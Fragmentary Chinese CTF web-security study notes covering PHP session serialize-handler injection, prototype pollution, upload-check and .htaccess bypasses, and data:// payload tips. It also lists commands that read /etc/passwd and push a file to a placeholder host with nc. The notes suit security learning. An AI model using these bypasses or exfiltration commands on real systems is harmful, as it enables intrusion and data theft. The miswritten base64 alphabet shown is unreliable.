...
* 基本概念
    ...
    * 处理器
        ...
        有三种不同的session处理模式，通过设置`php_serialize_handler`进行实现

        ```php
        <?php
        error_reporting(0);
        ini_set('session.serialize_handler','php'); # php处理器

        ini_set('session.serialize_handler','php_binary');  # php_binary处理器

        ini_set('session.serialize_handler','php_serialize');  # php_serialize处理器
        ...
        ![image-20231121171403774](./2021-05-26CTF%E8%A7%A3%E9%A2%98%E6%8A%80%E5%B7%A7/image-20231121171403774.png)

        ![image-20231121173121517](./2021-05-26CTF%E8%A7%A3%E9%A2%98%E6%8A%80%E5%B7%A7/image-20231121173121517.png)

        ![image-20231121173210677](./2021-05-26CTF%E8%A7%A3%E9%A2%98%E6%8A%80%E5%B7%A7/image-20231121173210677.png)
    ...
    * 原理
        ...
        当两个php脚本都进行了session处理，但是使用的处理器不同，会产生解析异常，比如，一个使用`php_serialize`进行session存储，一个使用`php`处理器对session信息进行获取

        如果只是普通的serialize存储结果`O:7:"XianZhi":1:{s:4:"name";s:7:"xianzhi";}`,php处理器无法识别session文件中的内容

        `a:1:{s:7:"session";s:43:"O:7:"XianZhi":1:{s:4:"name";s:7:"xianzhi";}";}`

        匹配不到`|`无法识别键值对

        如果存储时用户把session带上了`php`处理器中的标识符`|`，也就是`|O:7:"XianZhi":1:{s:4:"name";s:7:"xianzhi";}`

        session tmp文件中的内容是

        `a:1:{s:7:"session";s:44:"|O:7:"XianZhi":1:{s:4:"name";s:7:"xianzhi";}";}`

        将前部分`a:1:{s:7:"session";s:44:"`作为session的name进行解析，后面当作值进行解析

        ![image-20231122152816955](./2021-05-26CTF%E8%A7%A3%E9%A2%98%E6%8A%80%E5%B7%A7/image-20231122152816955.png)

        也就会发生将其他页面存储的session显示的情况

        ![image-20231122153038475](./2021-05-26CTF%E8%A7%A3%E9%A2%98%E6%8A%80%E5%B7%A7/image-20231122153038475.png)
...
>[从零开始python反序列化攻击：pickle原理解析 & 不用reduce的RCE姿势](https://www.zhihu.com/tardis/sogou/art/89132768)
...
原型链污染： https://www.anquanke.com/post/id/176884
继承于原型链： https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain

一道有趣的关于 nodejs的ctf题目： https://xz.aliyun.com/t/6991

p神深入理解 JavaScript Prototype 污染攻击： https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html

DefCamp CTF 2018： https://xz.aliyun.com/t/2802

nodejs总结   https://xz.aliyun.com/t/7184
...
* 概念
    ...
    在javascript中一切皆对象，因为所有的变量，函数，数组，对象 都始于object的原型即 object.prototype ，但只有类有对象，对象没有，对象有的是 `__proto__` 。
...
* 属性调用
    ...
    这里Son父类也就是原型新建为一个Father类，继承了父类的`last_name`，在js中，调用一个对象的属性顺序如下。
    ...
    那么，也就是说，可以通过回溯到父类的方式，更改原型中的值，当使用同原型创建对象的时候就会导致指定值被继承。


* 利用场景

    通过控制原型__proto__的值来利用，需要找到能够操作数组键值的函数：
    ...
    //原型链并没有被污染，因为__proto__已经代表原型，遍历o2的所有贱命只会得到[a,b]，我的理解是__proto__被解析了而不是被当作字符串进行处理，需要让__proto__被认为是一个键名
...
* Content-Type验证(MIME类型验证)

    >[HTTP报文中的MIME类型详解](https://zhuanlan.zhihu.com/p/651572991)
...
* 文件头验证
    ...
    `exif_imagetype()`函数读取文件的第一个字节并检查其签名，如果签名恰当则会返回true
...
* .htaccess
    ...
    //可以直接设置php中的auto_prepend_file，测试发现这道题用auto_append_file不起作用，其中使用斜杠进行换行，语句同样拼接执行，这个是.htaccess文件的特性，井号可以起到注释作用，但是当.htaccess文件被包含时是以文本形式包含的，井号被认为是普通字符，直到匹配到<?才认为是php代码开始，所以注释作用在包含文件中不会生效
...
* 题目逻辑
    ...
    先上传文件到指定目录，再检测文件是否合法

    ```php

    $allow_ext=arrat("gif","png","jpg")
...
* `data://text`
    ...
    要注意，如果通过get传参，base64编码后的payload尽量不要出现等号或者加号，可以采用`<?php xxx?>xxx`的方式改长度来令base64结果只有字母数字。

    如果出现了加号只能改长度，因为加号经url编码之后会变为空格，等号是填充符没什么影响，但是加号有意义，被去掉之后base64解码会失败。
...
## 新版php require_once重复包含绕过

>[php源码分析 require_once 绕过不能重复包含文件的限制](https://www.anquanke.com/post/id/213235#h3-2)
...
* information_schema
    ...
    mysql 5.7版本新增sys schema ,数据来源于performance_schema和information_schema
...
>[nodejs 中的漏洞技巧](https://xz.aliyun.com/t/9167#toc-0)

>[Node.js常见漏洞学习与总结](https://xz.aliyun.com/t/7184)
...
* 获取参数语句
    ...
    >https://qkongtao.cn/?p=272

    req.query.a 就是通过get方式获取a参数

    req.body.password  获取POST请求中的password参数
    ...
    访问localhost:3000/api/getUserListById/1
...
## windows-powershell
    ...
    # Get-Content 获取内容
    # Select-String 选取对应内容 -notmatch 剔除 
    # Sort-Object 对内容进行分类 -Unique 去重
...
* 读文件
    ...
    * `curl`
        ...
        将数据传输到网络服务器或从网络服务器传输数据
        `curl file:///etc/passwd`

    * `nc`

        `nc x.x.x.x 4444 < flag.txt`
        `nc -l 4444 > flag_new.txt`
...
* base64原理
    ...
    一个ascii字符一个byte，1byte=8bits

    `abc`->`01100001 01100010 01100011`，base64进行编码的时候每次取24bits进行分组，然后以6bits重新读取，也就变成了

    `011000 010110 001001 100011`，然后将其从字符表中对应位置读出`24,22,9,35`

    `ABCDEFGHIJKLMNOPQRSTUVWXYZzbcdefghijklmnopqrstuvwxyz0123456789+/`

    base64表从0开始索引，所以对应字母为`YWJj`
...
>[SQLMAP工具详解](https://zhuanlan.zhihu.com/p/377428620)
